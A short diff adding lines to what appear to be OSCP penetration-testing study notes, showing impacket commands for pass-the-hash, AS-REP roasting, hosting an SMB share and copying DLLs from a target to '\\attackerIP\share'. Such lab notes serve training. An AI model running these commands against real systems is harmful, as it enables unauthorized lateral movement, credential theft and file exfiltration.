@@ -64,3 +64,13 @@ proxychains -q impacket-psexec -hashes
 ```
 impacket-GetNPUsers sync.csl/manager -format john
 ```
+
+```
+sudo impacket-smbserver -smb2support share $(pwd)
+```
+
+![image](https://github.com/r1skkam/OffSec-PEN-200-OSCP-Preparation/assets/58542375/c49f33ee-54e0-4aaa-800f-f66de51e0b5a)
+
+```
+xcopy *.dll \\attackerIP\share\
+```
